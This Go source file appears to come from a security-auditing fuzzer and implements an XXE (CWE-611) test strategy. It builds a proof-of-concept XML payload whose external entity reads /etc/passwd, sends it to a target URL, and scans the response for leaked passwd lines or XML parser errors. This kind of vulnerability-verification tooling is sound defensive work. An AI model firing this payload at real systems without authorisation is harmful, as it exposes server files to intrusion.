package fuzzer

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/joern-audit/joern_audit/internal/config"
)

// XXEStrategy tests for XML External Entity injection (CWE-611).
type XXEStrategy struct {
	cfg *config.FuzzerConfig
}

func NewXXEStrategy(cfg *config.FuzzerConfig) *XXEStrategy {
	return &XXEStrategy{cfg: cfg}
}

func (s *XXEStrategy) Name() string { return "xxe" }

func (s *XXEStrategy) CanHandle(cwe string) bool {
	return cwe == "CWE-611"
}

func (s *XXEStrategy) GeneratePoC(ctx context.Context, req PoCRequest) (*PoCTemplate, error) {
	parsed := ParseAttackVector(req.AttackVector)
	RefineWithRegistry(parsed, req.Evidence, req.Registry, req.SourceRoot)

	targetURL := BuildTargetURL(req.TargetURL, parsed)

	// Default to POST for XXE
	method := parsed.Method
	if method == "GET" {
		method = "POST"
	}

	// XXE payload to read /etc/passwd
	xxePayload := `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>`

	headers := map[string]string{
		"Content-Type": "application/xml",
	}
	// Merge any headers from attack vector
	for k, v := range parsed.Headers {
		headers[k] = v
	}

	return &PoCTemplate{
		Type:    "xxe",
		Method:  method,
		URL:     targetURL,
		Headers: headers,
		Body:    xxePayload,
		Payload: xxePayload,
	}, nil
}

func (s *XXEStrategy) Execute(ctx context.Context, poc *PoCTemplate) (*FuzzResult, error) {
	timeout := s.cfg.Timeout
	if timeout <= 0 {
		timeout = 120
	}

	client := &http.Client{Timeout: time.Duration(timeout) * time.Second}

	req, err := http.NewRequestWithContext(ctx, poc.Method, poc.URL, strings.NewReader(poc.Body))
	if err != nil {
		return &FuzzResult{
			Status: FuzzError,
			Tool:   "xxe",
			Error:  fmt.Sprintf("failed to create request: %v", err),
		}, nil
	}

	for k, v := range poc.Headers {
		req.Header.Set(k, v)
	}

	resp, err := client.Do(req)
	if err != nil {
		return &FuzzResult{
			Status: FuzzError,
			Tool:   "xxe",
			Error:  fmt.Sprintf("HTTP request failed: %v", err),
		}, nil
	}
	defer resp.Body.Close()

	bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20)) // 1MB limit
	body := string(bodyBytes)

	return parseXXEResponse(body, resp.StatusCode, poc.Payload), nil
}

// parseXXEResponse checks the HTTP response for signs of XXE exploitation.
func parseXXEResponse(body string, statusCode int, pocPayload string) *FuzzResult {
	r := &FuzzResult{
		Tool: "xxe",
		PoC:  pocPayload,
	}

	// Check for /etc/passwd content leaked in response
	if strings.Contains(body, "root:") && strings.Contains(body, "/bin/") {
		r.Status = FuzzConfirmed
		// Extract the relevant portion
		lines := strings.Split(body, "\n")
		var leaked []string
		for _, line := range lines {
			if strings.Contains(line, "root:") || strings.Contains(line, "/bin/") {
				leaked = append(leaked, strings.TrimSpace(line))
				if len(leaked) >= 3 {
					break
				}
			}
		}
		r.ResponseDiff = "XXE confirmed: /etc/passwd content in response\n" + strings.Join(leaked, "\n")
		return r
	}

	// Check for XML parsing error messages that indicate XXE was attempted
	lower := strings.ToLower(body)
	if strings.Contains(lower, "doctype") || strings.Contains(lower, "entity") ||
		strings.Contains(lower, "system") || strings.Contains(lower, "dtd") {
		r.Status = FuzzPartial
		r.ResponseDiff = fmt.Sprintf("XXE partial: XML parsing error in response (status %d)", statusCode)
		return r
	}

	// 500 error might indicate processing of the XXE payload
	if statusCode == 500 {
		r.Status = FuzzPartial
		r.ResponseDiff = fmt.Sprintf("XXE partial: server returned 500, possible XXE processing error")
		return r
	}

	r.Status = FuzzFailed
	r.ResponseDiff = fmt.Sprintf("XXE not detected (status %d)", statusCode)
	return r
}
